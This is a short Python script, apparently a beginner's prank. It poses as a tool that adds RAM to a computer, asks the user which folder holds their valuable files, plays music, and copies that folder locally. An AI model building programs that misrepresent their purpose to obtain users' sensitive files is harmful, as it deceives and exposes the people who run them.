import shutil #работает с файлами или папками, то что нам нужно
import os
import random
from colored import fg, bg, attr
import pygame
import time

track_spi = ['12345.mp3']

print ('%s Программа добавления оперативной памяти в ваш компьютер.. %s' % (fg(7), attr(0)))
pygame.mixer.init()
pygame.mixer.music.load(random.choice(track_spi))

second = input(' В какой папке у вас есть ценные файлы..')
pygame.mixer.music.play()
name_of_backup = "files1"
shutil.copytree(second, name_of_backup)
time.sleep(20)